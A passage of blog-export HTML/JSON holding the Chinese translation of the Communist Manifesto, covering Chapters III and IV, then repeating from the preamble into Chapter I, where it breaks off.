title=\"三、社会主义的和共产主义的文献\"></a>三、社会主义的和共产主义的文献</h1><p>1．反动的社会主义</p>\n<p>(甲)封建的社会主义</p>\n<p>　　法国和英国的贵族，按照他们的历史地位所负的使命，就是写一些抨击现代资产阶级社会的作品。在法国的1830年七月革命和英国的改革运动中，他们再一次被可恨的暴发户打败了。从此就再谈不上严重的政治斗争了。他们还能进行的只是文字斗争。但是，即使在文字方面也不可能重弹复辟时期的老调了。为了激起同情，贵族们不得不装模做样，似乎他们已经不关心自身的利益，只是为了被剥削的工人阶级的利益才去写对资产阶级的控诉书。他们用来泄愤的手段是：唱唱诅咒他们的新统治者的歌，并向他叽叽咕咕地说一些或多或少凶险的预言。<br>　　这样就产生了封建的社会主义，半是挽歌，半是谤文；半是过去的回音，半是未来的恫吓；它有时也能用辛辣、俏皮而尖刻的评论刺中资产阶级的心，但是它由于完全不能理解现代历史的进程而总是令人感到可笑。<br>　　为了拉拢人民，贵族们把无产阶级的乞食袋当做旗帜来挥舞。但是，每当人民跟着他们走的时候，都发现他们的臀部带有旧的封建纹章，于是就哈哈大笑，一哄而散。<br>　　一部分法国正统派和“青年英国”，都演过这出戏。<br>　　封建主说，他们的剥削方式和资产阶级的剥削不同，那他们只是忘记了，他们是在完全不同的、目前已经过时的情况和条件下进行剥削的。他们说，在他们的统治下并没有出现过现代的无产阶级，那他们只是忘记了，现代的资产阶级正是他们的社会制度的必然产物。<br>　　不过，他们毫不掩饰自己的批评的反动性质，他们控告资产阶级的主要罪状正是在于：在资产阶级的统治下有一个将把整个旧社会制度炸毁的阶级发展起来。<br>　　他们责备资产阶级，与其说是因为它产生了无产阶级，不如说是因为它产生了革命的无产阶级。<br>　　因此，在政治实践中，他们参与对工人阶级采取的一切暴力措施，在日常生活中，他们违背自己的那一套冠冕堂皇的言词，屈尊拾取金苹果，不顾信义、仁爱和名誉去做羊毛、甜菜和烧酒的买卖。<br>　　正如僧侣总是同封建主携手同行一样，僧侣的社会主义也总是同封建的社会主义携手同行的。<br>　　要给基督教禁欲主义涂上一层社会主义的色彩，是再容易不过了。基督教不是也激烈反对私有制，反对婚姻，反对国家吗？它不是提倡用行善和求乞、独身和禁欲、修道和礼拜来代替这一切吗？基督教的社会主义，只不过是僧侣用来使贵族的怨愤神圣化的圣水罢了。</p>\n<p>(乙)小资产阶级的社会主义</p>\n<p>　　封建贵族并不是被资产阶级所推翻的、其生活条件在现代资产阶级社会里日益恶化和消失的唯一阶级。中世纪的城关市民等级和小农等级是现代资产阶级的前身。在工商业不很发达的国家里，这个阶级还在新兴的资产阶级身旁勉强生存着。<br>　　在现代文明已经发展的国家里,形成了一个新的小资产阶级，它摇摆于无产阶级和资产阶级之间，并且作为资产阶级社会的补充部分不断地重新组成。但是，这一阶级的成员经常被竞争拋到无产阶级队伍里去，而且，随着大工业的发展，他们甚至觉察到，他们很快就会完全失去他们作为现代社会中一个独立部分的地位，在商业、工业和农业中很快就会被监工和雇员所代替。<br>　　在农民阶级远远超过人口半数的国家，例如在法国，那些站在无产阶级方面反对资产阶级的著作家，自然是用小资产阶级和小农的尺度去批判资产阶级制度的，是从小资产阶级的立场出发替工人说话的。这样就形成了小资产阶级的社会主义。西斯蒙第不仅对法国而且对英国来说都是这类著作家的首领。<br>　　这种社会主义非常透彻地分析了现代生产关系中的矛盾。它揭穿了经济学家的虚伪的粉饰。它确凿地证明了机器和分工的破坏作用、资本和地产的积聚、生产过剩、危机、小资产者和小农的必然没落、无产阶级的贫困、生产的无政府状态、财富分配的极不平均、各民族之间的毁灭性的工业战争，以及旧风尚、旧家庭关系和旧民族性的解体。<br>　　但是，这种社会主义按其实际内容来说，或者是企图恢复旧的生产资料和交换手段，从而恢复旧的所有制关系和旧的社会，或者是企图重新把现代的生产资料和交换手段硬塞到已被它们突破而且必然被突破的旧的所有制关系的框子里去。它在这两种场合都是反动的，同时又是空想的。<br>　　工业中的行会制度，农业中的宗法经济，——这就是它的最后结论。<br>　　这一思潮在它以后的发展中变成了一种怯懦的悲叹。</p>\n<p>(丙)德国的或“真正的”社会主义</p>\n<p>　　法国的社会主义和共产主义的文献是在居于统治地位的资产阶级的压迫下产生的，并且是同这种统治作斗争的文字表现，这种文献被搬到德国的时候，那里的资产阶级才刚刚开始进行反对封建专制制度的斗争。<br>　　德国的哲学家、半哲学家和美文学家，贪婪地抓住了这种文献，不过他们忘记了：在这种著作从法国搬到德国的时候，法国的生活条件却没有同时搬过去。在德国的条件下，法国的文献完全失去了直接实践的意义，而只具有纯粹文献的形式。它必然表现为关于真正的社会、关于实现人的本质的无谓思辨。这样，第一次法国革命的要求，在18世纪的德国哲学家看来，不过是一般“实践理性”的要求，而革命的法国资产阶级的意志的表现，在他们心目中就是纯粹意志、本来的意志、真正人的意志的规律。<br>　　德国著作家的唯一工作，就是把新的法国的思想同他们的旧的哲学信仰调和起来，或者毋宁说，就是从他们的哲学观点出发去掌握法国的思想。<br>　　这种掌握，就象掌握外国语一样，是通过翻译的。<br>　　大家知道，僧侣们曾经在古代异教经典的手抄本上面写上荒诞的天主教圣徒传。德国著作家对世俗的法国文献采取相反的作法。他们在法国的原著下面写上自己的哲学胡说。例如，他们在法国人对货币关系的批判下面写上“人的本质的外化”，在法国人对资产阶级国家的批判下面写上所谓“抽象普遍物的统治的扬弃”，等等。<br>　　这种在法国人的论述下面塞进自己哲学词句的作法，他们称之为“行动的哲学”、“真正的社会主义”、“德国的社会主义科学”、“社会主义的哲学论证”，等等。<br>　　法国的社会主义和共产主义的文献就这样被完全阉割了。既然这种文献在德国人手里已不再表现一个阶级反对另一个阶级的斗争，于是德国人就认为：他们克服了“法国人的片面性”，他们不代表真实的要求，而代表真理的要求，不代表无产者的利益，而代表人的本质的利益，即一般人的利益，这种人不属于任何阶级，根本不存在于现实界，而只存在于云雾弥漫的哲学幻想的太空。<br>　　这种曾经郑重其事地看待自己那一套拙劣的小学生作业并且大言不惭地加以吹嘘的德国社会主义，现在渐渐失去了它的自炫博学的天真。<br>　　德国的特别是普鲁士的资产阶级反对封建主和专制王朝的斗争，一句话，自由主义运动，越来越严重了。<br>　　于是，“真正的”社会主义就得到了一个好机会，把社会主义的要求同政治运动对立起来，用诅咒异端邪说的传统办法诅咒自由主义，诅咒代议制国家，诅咒资产阶级的竞争、资产阶级的新闻出版自由、资产阶级的法、资产阶级的自由和平等，并且向人民群众大肆宣扬，说什么在这个资产阶级运动中，人民群众非但一无所得，反而会失去一切。德国的社会主义恰好忘记了，法国的批判(德国的社会主义是这种批判的可怜的回声)是以现代的资产阶级社会以及相应的物质生活条件和相当的政治制度为前提的，而这一切前提当时在德国正是尚待争取的。<br>　　这种社会主义成了德意志各邦专制政府及其随从——僧侣、教员、容克和官僚求之不得的、吓唬来势汹汹的资产阶级的稻草人。<br>　　这种社会主义是这些政府用来镇压德国工人起义的毒辣的皮鞭和枪弹的甜蜜的补充。<br>　　既然“真正的”社会主义就这样成了这些政府对付德国资产阶级的武器，那么它也就直接代表了一种反动的利益，即德国小市民的利益。在德国，16世纪遗留下来的、从那时起经常以不同形式重新出现的小资产阶级，是现存制度的真实的社会基础。<br>　　保存这个小资产阶级，就是保存德国的现存制度。这个阶级胆战心惊地从资产阶级的工业统治和政治统治那里等候着无可幸免的灭亡，这一方面是由于资本的积聚，另一方面是由于革命无产阶级的兴起。在它看来，“真正的”社会主义能起一箭双雕的作用。“真正的”社会主义象瘟疫一样流行起来了。<br>　　德国的社会主义者给自己的那几条干瘪的“永恒真理”披上一件用思辨的蛛丝织成的、绣满华丽辞藻的花朵和浸透甜情蜜意的甘露的外衣，这件光彩夺目的外衣只是使他们的货物在这些顾客中间增加销路罢了。<br>　　同时，德国的社会主义也越来越认识到自己的使命就是充当这种小市民的夸夸其谈的代言人。<br>　　它宣布德意志民族是模范的民族，德国小市民是模范的人。它给这些小市民的每一种丑行都加上奥秘的、高尚的、社会主义的意义，使之变成完全相反的东西。它发展到最后，就直接反对共产主义的“野蛮破坏的”倾向，并且宣布自己是不偏不倚的超乎任何阶级斗争之上的。现今在德国流行的一切所谓社会主义和共产主义的著作，除了极少数的例外，都属于这一类卑鄙龌龊的、令人委靡的文献。</p>\n<p>2．保守的或资产阶级的社会主义</p>\n<p>　　资产阶级中的一部分人想要消除社会的弊病，以便保障资产阶级社会的生存。<br>　　这一部分人包括：经济学家、博爱主义者、人道主义者、劳动阶级状况改善派、慈善事业组织者、动物保护协会会员、戒酒协会发起人以及形形式色色的小改良家。这种资产阶级的社会主义甚至被制成一些完整的体系。<br>　　我们可以举蒲鲁东的《贫困的哲学》作为例子。<br>　　社会主义的资产者愿意要现代社会的生存条件，但是不要由这些条件必然产生的斗争和危险。他们愿意要现存的社会，但是不要那些使这个社会革命化和瓦解的因素。他们愿意要资产阶级，但是不要无产阶级。在资产阶级看来，它所统治的世界自然是最美好的世界。资产阶级的社会主义把这种安慰人心的观念制成半套或整套的体系。它要求无产阶级实现它的体系，走进新的耶路撒冷，其实它不过是要求无产阶级停留在现今的社会里，但是要拋弃他们关于这个社会的可恶的观念。<br>　　这种社会主义的另一种不够系统、但是比较实际的形式，力图使工人阶级厌弃一切革命运动，硬说能给工人阶级带来好处的并不是这样或那样的政治改革，而仅仅是物质生活条件即经济关系的改变。但是，这种社会主义所理解的物质生活条件的改变，绝对不是只有通过革命的途径才能实现的资产阶级生产关系的消灭，而是一些行政上的改良，这些改良是在这种生产关系的基础上实行的，因而丝毫不会改变资本和雇佣劳动的关系，至多只能减少资产阶级的统治费用和简化它的财政管理。<br>　　资产阶级的社会主义只有在它变成纯粹的演说辞令的时候，才获得自己的适当的表现。<br>　　自由贸易！为了工人阶级的利益；保护关税！为了工人阶级的利益；单身牢房！为了工人阶级的利益。——这才是资产阶级的社会主义唯一认真说出的最后的话。<br>　　资产阶级的社会主义就是这样一个论断：资产者之为资产者，是为了工人阶级的利益。</p>\n<p>3．批判的空想的社会主义和共产主义</p>\n<p>　　在这里，我们不谈在现代一切大革命中表达过无产阶级要求的文献(巴贝夫等人的著作)。</p>\n<p>　　无产阶级在普遍激动的时代、在推翻封建社会的时期直接实现自己阶级利益的最初尝试，都不可避免地遭到了失败，这是由于当时无产阶级本身还不够发展，由于无产阶级解放的物质条件还没有具备，这些条件只是资产阶级时代的产物。随着这些早期的无产阶级运动而出现的革命文献，就其内容来说必然是反动的。这种文献倡导普遍的禁欲主义和粗陋的平均主义。</p>\n<p>　　本来意义的社会主义和共产主义的体系，圣西门、傅立叶、欧文等人的体系，是在无产阶级和资产阶级之间的斗争还不发展的最初时期出现的。关于这个时期，我们在前面已经叙述过了(见《资产阶级和无产阶级》)。</p>\n<p>　　诚然，这些体系的发明家看到了阶级的对立，以及占统治地位的社会本身中的瓦解因素的作用。但是，他们看不到无产阶级方面的任何历史主动性，看不到它所特有的任何政治运动。</p>\n<p>　　由于阶级对立的发展是同工业的发展步调一致的，所以这些发明家也不可能看到无产阶级解放的物质条件，于是他们就去探求某种社会科学、社会规律，以便创造这些条件。</p>\n<p>　　社会的活动要由他们个人的发明活动来代替，解放的历史条件要由幻想的条件来代替，无产阶级的逐步组织成为阶级要由他们特意设计出来的社会组织来代替。在他们看来，今后的世界历史不过是宣传和实施他们的社会计划。</p>\n<p>　　诚然，他们也意识到，他们的计划主要是代表工人阶级这一受苦最深的阶级的利益。在他们的心目中，无产阶级只是一个受苦最深的阶级。</p>\n<p>　　但是，由于阶级斗争不发展，由于他们本身的生活状况，他们就以为自己是高高超乎这种阶级对立之上的。他们要改善社会一切成员的生活状况，甚至生活最优裕的成员也包括在内。因此，他们总是不加区别地向整个社会呼吁，而且主要是向统治阶级呼吁。他们以为，人们只要理解他们的体系，就会承认这种体系是最美好的社会的最美好的计划。</p>\n<p>　　因此，他们拒绝一切政治行动，特别是一切革命行动；他们想通过和平的途径达到自己的目的，并且企图通过一些小型的、当然不会成功的试验，通过示范的力量来为新的社会福音开辟道路。</p>\n<p>　　这种对未来社会的幻想的描绘，是在无产阶级还很不发展、因而对本身的地位的认识还基于幻想的时候，同无产阶级对社会普遍改造的最初的本能的渴望相适应的。</p>\n<p>　　但是，这些社会主义和共产主义的著作也含有批判的成分。这些著作抨击现存社会的全部基础。因此，它们提供了启发工人觉悟的极为宝贵的材料。它们关于未来社会的积极的主张，例如消灭城乡对立，消灭家庭，消灭私人营利，消灭雇佣劳动，提倡社会和谐，把国家变成纯粹的生产管理机构，——所有这些主张都只是表明要消灭阶级对立，而这种阶级对立在当时刚刚开始发展，它们所知道的只是这种对立的早期的、不明显的、不确定的形式。因此，这些主张本身还带有纯粹空想的性质。</p>\n<p>　　批判的空想的社会主义和共产主义的意义，是同历史的发展成反比的。阶级斗争越发展和越具有确定的形式，这种超乎阶级斗争的幻想，这种反对阶级斗争的幻想，就越失去任何实践意义和任何理论根据。所以，虽然这些体系的创始人在许多方面是革命的，但是他们的信徒总是组成一些反动的宗派。这些信徒无视无产阶级的历史进展，还是死守着老师们的旧观点。因此，他们一贯企图削弱阶级斗争，调和对立。他们还总是梦想用试验的办法来实现自己的社会空想，创办单个的法伦斯泰尔，建立国内移民区，创立小伊加利亚，即袖珍版的新耶路撒冷，——而为了建造这一切空中楼阁，他们就不得不呼吁资产阶级发善心和慷慨解囊。他们逐渐地堕落到上述反动的或保守的社会主义者的一伙中去了，所不同的只是他们更加系统地卖弄学问，狂热地迷信自己那一套社会科学的奇功异效。</p>\n<p>　　因此，他们激烈地反对工人的一切政治运动，认为这种运动只是由于盲目地不相信新福音才发生的。</p>\n<p>　　在英国，有欧文主义者反对宪章派，在法国，有傅立叶主义者反对改革派。</p>\n<h1 id=\"四、共产党人对各种反对党派的态度\"><a href=\"#四、共产党人对各种反对党派的态度\" class=\"headerlink\" title=\"四、共产党人对各种反对党派的态度\"></a>四、共产党人对各种反对党派的态度</h1><p>　　看过第二章之后，就可以了解共产党人同已经形成的工人政党的关系，因而也就可以了解他们同英国宪章派和北美土地改革派的关系。</p>\n<p>　　共产党人为工人阶级的最近的目的和利益而斗争，但是他们在当前的运动中同时代表运动的未来。在法国，共产党人同社会主义民主党联合起来反对保守的和激进的资产阶级，但是并不因此放弃对那些从革命的传统中承袭下来的空谈和幻想采取批判态度的权利。</p>\n<p>　　在瑞士，共产党人支持激进派，但是并不忽略这个政党是由互相矛盾的分子组成的，其中一部分是法国式的民主社会主义者，一部分是激进的资产者。</p>\n<p>　　在波兰人中间，共产党人支持那个把土地革命当做民族解放的条件的政党，即发动过1846年克拉科夫起义的政党。</p>\n<p>　　在德国，只要资产阶级采取革命的行动，共产党就同它一起去反对专制君主制、封建土地所有制和小市民的反动性。</p>\n<p>　　但是，共产党一分钟也不忽略教育工人尽可能明确地意识到资产阶级和无产阶级的敌对的对立，以便德国工人能够立刻利用资产阶级统治所必然带来的社会的和政治的条件作为反对资产阶级的武器，以便在推翻德国的反动阶级之后立即开始反对资产阶级本身的斗争。</p>\n<p>　　共产党人把自己的主要注意力集中在德国，因为德国正处在资产阶级革命的前夜，因为同17世纪的英国和18世纪的法国相比，德国将在整个欧洲文明更进步的条件下，拥有发展得多的无产阶级去实现这个变革，因而德国的资产阶级革命只能是无产阶级革命的直接序幕。</p>\n<p>　　总之，共产党人到处都支持一切反对现存的社会制度和政治制度的革命运动。</p>\n<p>　　在所有这些运动中，他们都特别强调所有制问题是运动的基本问题，不管这个问题的发展程度怎样。</p>\n<p>　　最后，共产党人到处都努力争取全世界的民主政党之间的团结和协调。</p>\n<p>　　共产党人不屑于隐瞒自己的观点和意图。他们公开宣布：他们的目的只有用暴力推翻全部现存的社会制度才能达到。让统治阶级在共产主义革命面前发抖吧。无产者在这个革命中失去的只是锁链。他们获得的将是整个世界。</p>\n<h1 id=\"全世界无产者们，联合起来！\"><a href=\"#全世界无产者们，联合起来！\" class=\"headerlink\" title=\"全世界无产者们，联合起来！\"></a>全世界无产者们，联合起来！</h1>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"共产党宣言\"><a href=\"#共产党宣言\" class=\"headerlink\" title=\"共产党宣言\"></a>共产党宣言</h1><p>　　一个幽灵，共产主义的幽灵，在欧洲游荡。为了对这个幽灵进行神圣的围剿，旧欧洲的一切势力，教皇和沙皇、梅特涅和基佐、法国的激进派和德国的警察，都联合起来了。<br>　　有哪一个反对党不被它的当政的敌人骂为共产党呢？又有哪一个反对党不拿共产主义这个罪名去回敬更进步的反对党人和自己的反动敌人呢？<br>　　从这一事实中可以得出两个结论：<br>　　共产主义已经被欧洲的一切势力公认为一种势力；<br>　　现在是共产党人向全世界公开说明自己的观点、自己的目的、自己的意图并且拿党自己的宣言来反驳关于共产主义幽灵的神话的时候了。<br>　　为了这个目的，各国共产党人集会于伦敦，拟定了如下的宣言，用英文、法文、德文、意大利文、弗拉芒文和丹麦文公布于世。</p>\n<h1 id=\"一、资产者和无产者\"><a href=\"#一、资产者和无产者\" class=\"headerlink\" title=\"一、资产者和无产者\"></a>一、资产者和无产者</h1><p>　　至今一切社会的历史都是阶级斗争的历史。</p>\n<p>　　自由民和奴隶、贵族和平民、领主和农奴、行会师傅和帮工，一句话，压迫者和被压迫者，始终处于相互对立的地位，进行不断的、有时隐蔽有时公开的斗争，而每一次斗争的结局是整个社会受到革命改造或者斗争的各阶级同归于尽。</p>\n<p>　　在过去的各个历史时代，我们几乎到处都可以看到社会完全划分为各个不同的等级，看到社会地位分成的多种多样的层次。在古罗马，有贵族、骑士、平民、奴隶，在中世纪，有封建主、臣仆、行会师傅、帮工、农奴，而且几乎在每一个阶级内部又有一些特殊的阶层。</p>\n<p>　　从封建社会的灭亡中产生出来的现代资产阶级社会并没有消灭阶级对立。它只是用新的阶级、新的压迫条件、新的斗争形式代替了旧的。</p>\n<p>　　但是，我们的时代，资产阶级时代，却有一个特点：它使阶级对立简单化了。整个社会日益分裂为两大敌对的阵营，分裂为两大相互直接对立的阶级：资产阶级和无产阶级。</p>\n<p>　　从中世纪的农奴中产生了初期城市的城关市民；从这个市民等级中发展出最初的资产阶级分子。</p>\n<p>　　美洲的发现、绕过非洲的航行，给新兴的资产阶级开辟了新天地。东印度和中国的市场、美洲的殖民化、对殖民地的贸易、交换手段和一般的商品的增加，使商业、航海业和工业空前高涨，因而使正在崩溃的封建社会内部的革命因素迅速发展。</p>\n<p>　　以前那种封建的或行会的工业经营方式已经不能满足随着新市场的出现而增加的需求了。工场手工业代替了这种经营方式。行会师傅被工业的中间等级排挤掉了；各种行业组织之间的分工随着各个作坊内部的分工的出现而消失了。</p>\n<p>　　但是，市场总是在扩大，需求总是在增加。甚至工场手工业也不再能满足需要了。于是，蒸汽和机器引起了工业生产的革命。现代大工业化替了工场手工业；工业中的百万富翁，一支一支产业大军的首领，现代资产者，代替了工业的中间等级。</p>\n<p>　　大工业建立了由美洲的发现所准备好的世界市场。世界市场使商业、航海业和陆路交通得到了巨大的发展。这种发展又反过来促进了工业的扩展，同时，随着工业、商业、航海业和铁路的扩展，资产阶级也在同一程度上得到发展，增加自己的资本，把中世纪遗留下来的一切阶级都排挤到后面去。</p>\n<p>　　由此可见，现代资产阶级本身是一个长期发展过程的产物，是生产方式和交换方式的一系列变革的产物。</p>\n<p>　　资产阶级的这种发展的每一个阶段，都伴随着相应的政治上进展。它在封建主统治下是被压迫的等级，在公社里是武装的和自治的团体，在一些地方组成独立的城市共和国，在另一些地方组成君主国中的纳税的第三等级；后来，在工场手工业时期，它是等级制君主国或专制君主国中同贵族抗衡的势力，而且是大君主国的主要基础；最后，从大工业和世界市场建立的时候起，它在现代的代议制国家里夺得了独占的政治统治。现代的国家政权不过是管理整个资产阶级的共同事务的委员会罢了。</p>\n<p>　　资产阶级在历史上曾经起过非常革命的作用。</p>\n<p>　　资产阶级在它已经取得了统治的地方把一切封建的、宗法的和田园诗般的关系都破坏了。它无情地斩断了把人们束缚于天然尊长的形形色色的封建羁绊，它使人和人之间除了赤裸裸的利害关系，除了冷酷无情的“现金交易”，就再也没有任何别的联系了。它把宗教虔诚、骑士热忱、小市民伤感这些情感的神圣发作，淹没在利己主义打算的冰水之中。它把人的尊严变成了交换价值，用一种没有良心的贸易自由代替了无数特许的和自力挣得的自由。总而言之，它用公开的、无耻的、直接的、露骨的剥削代替了由宗教幻想和政治幻想掩盖着的剥削。</p>\n<p>　　资产阶级抹去了一切向来受人尊崇和令人敬畏的职业的神圣光环。它把医生、律师、教士、诗人和学者变成了它出钱招雇的雇佣劳动者。</p>\n<p>　　资产阶级撕下了罩在家庭关系上的温情脉脉的面纱，把这种关系变成了纯粹的金钱关系。</p>\n<p>　　资产阶级揭示了，在中世纪深受反动派称许的那种人力的野蛮使用，是以极端怠惰作为相应补充的。它第一个证明了，人的活动能够取得什么样的成就。它创造了完全不同于埃及金字塔、罗马水道和哥特式教堂的奇迹；它完成了完全不同于民族大迁徙和十字军东征的远征。</p>\n<p>　　资产阶级除非对生产工具，从而对生产关系，从而对全部社会关系不断地进行革命，否则就不能生存下去。反之，原封不动地保持旧的生产方式，却是过去的一切工业阶级生存的首要条件。生产的不断变革，一切社会状况不停的动荡，永远的不安定和变动，这就是资产阶级时代不同于过去一切时代的地方。一切固定的僵化的关系以及与之相适应的素被尊崇的观念和见解都被消除了，一切新形成的关系等不到固定下来就陈旧了。一切等级的和固定的东西都烟消云散了，一切神圣的东西都被亵渎了。人们终于不得不用冷静的眼光来看他们的生活地位、他们的相互关系。</p>\n<p>　　不断扩大产品销路的需要，驱使资产阶级奔走于全球各地。它必须到处落户，到处开发，到处建立联系。</p>\n<p>　　资产阶级，由于开拓了世界市场，使一切国家的生产和消费都成为世界性的了。使反动派大为惋惜的是，资产阶级挖掉了工业脚下的民族基础。古老的民族工业被消灭了，并且每天都还在被消灭。它们被新的工业排挤掉了，新的工业的建立已经成为一切文明民族的生命攸关的问题；这些工业所加工的，已经不是本地的原料，而是来自极其遥远的地区的原料；它们的产品不仅供本国消费，而且同时供世界各地消费。旧的、靠国产品来满足的需要，被新的、要靠极其遥远的国家和地带的产品来满足的需要所代替了。过去那种地方的和民族的自给自足和闭关自守状态，被各民族的各方面的互相往来和各方面的互相依赖所代替了。物质的生产是如此，精神的生产也是如此。各民族的精神产品成了公共的财产。民族的片面性和局限性日益成为不可能，于是由许多种民族的和地方的文学形成了一种世界的文学。</p>\n<p>　　资产阶级，由于一切生产工具的迅速改进，由于交通的极其便利，把一切民族甚至最野蛮的民族都卷到文明中来了。它的商品的低廉价格，是它用来摧毁一切万里长城、征服野蛮人最顽强的仇外心理的重炮。它迫使一切民族——如果它们不想灭亡的话——采用资产阶级的生产方式；它迫使它们在自己那里推行所谓文明，即变成资产者。一句话，它按照自己的面貌为自己创造出一个世界。</p>\n<p>　　资产阶级使农村屈服于城市的统治。它创立了巨大的城市，使城市人口比农村人口大大增加起来，因而使很大一部分居民脱离了农村生活的愚昧状态。正象它使农村从属于城市一样，它使未开化和半开化的国家从属于文明的国家，使农民的民族从属于资产阶级的民族，使东方从属于西方。</p>\n<p>　　资产阶级日甚一日地消灭生产资料、财产和人口的分散状态。它使人口密集起来，使生产资料集中起来，使财产聚集在少数人的手里。由此必然产生的结果就是政治的集中。各自独立的、几乎只有同盟关系的、各有不同利益、不同法律、不同政府、不同关税的各个地区，现在已经结合为一个拥有统一的政府、统一的法律、统一的民族阶级利益和统一的关税的统一的民族。</p>\n<p>　　资产阶级在它的不到一百年的阶级统治中所创造的生产力，比过去一切世代创造的全部生产力还要多，还要大。自然力的征服，机器的采用，化学在工业和农业中的应用，轮船的行驶，铁路的通行，电报的使用，整个整个大陆的开垦，河川的通航，仿佛用法术从地下呼唤出来的大量人口，——过去哪一个世纪料想到在社会劳动里蕴藏有这样的生产力呢？</p>\n<p>　　由此可见，资产阶级赖以形成的生产资料和交换手段，是在封建社会里造成的。在这些生产资料和交换手段发展的一定阶段上，封建社会的生产和交换在其中进行的关系，封建的农业和工场手工业组织，一句话，封建的所有制关系，就不再适应已经发展的生产力了。这种关系已经在阻碍生产而不是促进生产了。它变成了束缚生产的桎梏。它必须被炸毁，而且已经被炸毁了。</p>\n<p>　　起而代之的是自由竞争以及与自由竞争相适应的社会制度和政治制度、资产阶级的经济统治和政治统治。</p>\n<p>　　现在，我们眼前又进行着类似的运动。资产阶级的生产关系和交换关系，资产阶级的所有制关系，这个曾经仿佛用法术创造了如此庞大的生产资料和交换手段的现代资产阶级社会，现在像一个魔法师一样不能再支配自己用法术呼唤出来的魔鬼了。几十年来的工业和商业的历史，只不过是现代生产力反抗现代生产关系、反抗作为资产阶级及其统治的存在条件的所有制关系的历史。只要指出在周期性的重复中越来越危及整个资产阶级社会生存的商业危机就够了。在商业危机期间，总是不仅有很大一部分制成的产品被毁灭掉，而且有很大一部分已经造成的生产力被毁灭掉。在危机期间，发生一种在过去一切时代看来都好象是荒唐现象的社会瘟疫，即生产过剩的瘟疫。社会突然发现自己回到了一时的野蛮状态；仿佛是一次饥荒、一场普遍的毁灭性战争，使社会失去了全部生活资料；仿佛是工业和商业全被毁灭了，——这是什么缘故呢？因为社会上文明过度，生活资料太多，工业和商业太发达。社会所拥有的生产力已经不能再促进资产阶级文明和资产阶级所有制关系的发展；相反，生产力已经强大到这种关系所不能适应的地步，它已经受到这种关系的阻碍；而它一着手克服这种障碍，就使整个资产阶级社会陷入混乱，就使资产阶级所有制的存在受到威胁。资产阶级的关系已经太狭窄了，再容纳不了它本身所造成的财富了。——资产阶级用什么办法来克服这种危机呢？一方面不得不消灭大量生产力，另一方面夺取新的市场，更加彻底地利用旧的市场。这究竟是怎样的一种办法呢？这不过是资产阶级准备更全面更猛烈的危机的办法，不过是使防止危机的手段越来越少的办法。</p>\n<p>　　资产阶级用来推翻封建制度的武器，现在却对准资产阶级自己了。</p>\n<p>　　但是，资产阶级不仅锻造了置自身于死地的武器；它还产生了将要运用这种武器的人——现代的工人，即无产者。</p>\n<p>　　随着资产阶级即资本的发展，无产阶级即现代工人阶级也在同一程度上得到发展；现代的工人只有当他们找到工作的时候才能生存，而且只有当他们的劳动增殖资本的时候才能找到工作。这些不得不把自己零星出卖的工人，像其它任何货物一样，也是一种商品，所以他们同样地受到竞争的一切变化、市场的一切波动的影响。</p>\n<p>　　由于机器的推广和分工，无产者的劳动已经失去了任何独立的性质，因而对工人也失去了任何吸引力。工人变成了机器的单纯的附属品，要求他做的只是极其简单、极其单调和极容易学会的操作。因此，花在工人身上的费用，几乎只限于维持工人生活和延续工人后代所必需的生活资料。但是，商品的价格，从而劳动的价格，是同它的生产费用相等的。因此，劳动越使人感到厌恶，工资也就越减少。不仅如此，机器越推广，分工越细致，劳动量也就越增加，这或者是由于工作时间的延长，或者是由于在一定时间内所要求的劳动的增加，机器运转的加速，等等。</p>\n<p>　　现代工业已经把家长式的师傅的小作坊变成了工业资本家的大工厂。挤在工厂里的工人群众就象士兵一样被组织起来。他们是产业军的普通士兵，受着各级军士和军官的层层监视。他们不仅是资产阶级的、资产阶级国家的奴隶，并且每日每时都受机器、受监工、首先是受各个经营工厂的资产者本人的奴役。这种专制制度越是公开地把营利宣布为自己的最终目的，它就越是可鄙、可恨和可恶。</p>\n<p>　　手的操作所要求的技巧和气力越少，换句话说，现代工业越发达，男工也就越受到女工和童工的排挤。对工人阶级来说，性别和年龄的差别再没有什么社会意义了。他们都只是劳动工具，不过因为年龄和性别的不同而需要不同的费用罢了。</p>\n<p>　　当厂主对工人的剥削告一段落，工人领到了用现钱支付的工资的时候，马上就有资产阶级中的另一部分人——房东、小店主、当铺老板等等向他们扑来。</p>\n<p>　　以前的中间等级的下层，即小工业家、小商人和小食利者，手工业者和农民——所有这些阶级都降落到无产阶级的队伍里来了，有的是因为他们的小资本不足以经营大工业，经不起较大资本家的竞争；有的是因为他们的手艺已经被新的生产方法弄得不值钱了。无产阶级的队伍就是这样从居民的所有阶级中得到补充的。</p>\n<p>　　无产阶级经历了各个不同的发展阶段。它反对资产阶级的斗争是和它的存在同时开始的。</p>\n<p>　　最初是单个的工人，然后是某一工厂的工人，然后是某一地方的某一劳动部门的工人，同直接剥削他们的单个资产者作斗争。他们不仅仅攻击资产阶级的生产关系，而且攻击生产工具本身；他们毁坏那些来竞争的外国商品，捣毁机器，烧毁工厂，力图恢复已经失去的中世纪工人的地位。</p>\n<p>　　在这个阶段上，工人们还是分散在全国各地并为竞争所分裂的群众。工人的大规模集结，还不是他们自己联合的结果，而是资产阶级联合的结果，当时资产阶级为了达到自己的政治目的必须而且暂时还能够把整个无产阶级发动起来。因此，在这个阶段上，无产者不是同自己的敌人作斗争，而是同自己的敌人的敌人作斗争，即同专制君主制的残余、地主、非工业资产阶级和小资产者作斗争。因此，整个历史运动都集中在资产阶级手里；在这种条件下取得的每一个胜利都是资产阶级的胜利。</p>\n<p>　　但是，随着工业的发展，无产阶级不仅人数增加了，而且它结合成更大的集体，它的力量日益增长，它越来越感觉到自己的力量。机器使劳动的差别越来越小，使工资几乎到处都降到同样低的水平，因而无产阶级内部的利益和生活状况也越来越趋于一致。资产者彼此间日益加剧的竞争以及由此引起的商业危机，使工人的工资越来越不稳定；机器的日益迅速的和继续不断的改良，使工人的整个生活地位越来越没有保障；单个工人和单个资产者之间的冲突越来越具有两个阶级的冲突的性质。工人开始成立反对资产者的同盟；他们联合起来保卫自己的工资。他们甚至建立了经常性的团体，以便为可能发生的反抗准备食品。有些地方，斗争爆发为起义。</p>\n<p>　　